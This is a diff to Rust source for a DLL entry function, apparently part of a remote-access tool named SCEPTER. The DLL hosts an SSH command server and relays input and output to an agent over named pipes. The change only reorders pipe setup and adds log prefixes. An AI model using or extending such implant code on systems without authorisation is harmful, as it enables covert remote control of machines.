@@ -28,6 +28,20 @@ pub async fn dll_main() {
     debug_println!("Initialized handles");
     debug_println!("Starting server");
 
+    // Initialize output pipe
+    unsafe {
+        G_H_OUTPUT_PIPE = initialize_output_pipe().unwrap_or_else(|| {
+            debug_eprintln!("Failed to initialize output pipe.");
+            TerminateThread(GetCurrentThread(), 1);
+            0 as HANDLE // Rust silliness
+        });
+    }
+
+    // Execute the async function on this thread's runtime
+    unsafe  {
+        pipe::write_output(G_H_OUTPUT_PIPE, "[SCEPTER] Server initiated.")
+    };
+
     let config = russh::server::Config {
         inactivity_timeout: Some(std::time::Duration::from_secs(3600)),
         auth_rejection_time: std::time::Duration::from_secs(10),
@@ -51,6 +65,7 @@ pub async fn dll_main() {
         .to_string()
         .trim_matches(char::from(0))
         .to_string();
+
     // Clone sh if needed (if it's a type that implements Clone)
     let mut sh_clone = sh.clone();
 
@@ -60,18 +75,9 @@ pub async fn dll_main() {
     thread::spawn(move || {
         debug_println!("Initializing handles");
 
-        // Initialize output pipe
         unsafe {
+            // Initializing the input pipe is blocking, so agent should already be trying to connect to us
             G_H_INPUT_PIPE = initialize_input_pipe().unwrap_or_else(|| {
-                debug_eprintln!("Failed to initialize input pipe.");
-                TerminateThread(GetCurrentThread(), 1);
-                0 as HANDLE // Rust silliness
-            });
-        }
-
-        // Initialize output pipe
-        unsafe {
-            G_H_OUTPUT_PIPE = initialize_output_pipe().unwrap_or_else(|| {
                 debug_eprintln!("Failed to initialize input pipe.");
                 TerminateThread(GetCurrentThread(), 1);
                 0 as HANDLE // Rust silliness
@@ -84,7 +90,6 @@ pub async fn dll_main() {
         // Clone the object if needed
         let mut sh_clone = sh.clone();
 
-        // Execute the async function on this thread's runtime
         rt.block_on(async {
             sh_clone.command_loop().await;
         });
@@ -184,7 +189,7 @@ impl server::Server for Server {
                 let port = addr.unwrap().port();
                 write_output(
                     G_H_OUTPUT_PIPE,
-                    &format!("Connection established {}:{}.\r\n", ip, port),
+                    &format!("[SCEPTER] Connection established {}:{}.\r\n", ip, port),
                 );
             }
         }
